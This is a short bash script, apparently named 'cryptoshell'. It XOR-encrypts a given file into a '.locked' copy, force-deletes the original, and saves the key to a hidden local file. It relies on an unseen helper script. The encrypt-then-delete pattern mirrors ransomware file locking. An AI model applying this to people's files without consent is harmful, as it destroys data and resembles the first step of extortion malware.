#!/bin/bash

if [ $# -eq 0 ]
then
	exit 1
fi

source xor_helper.sh
key=$(generate_key)
xor_file "$1" "$1.locked" $key
rm -f "$1"
echo $key > .cryptoshell_key
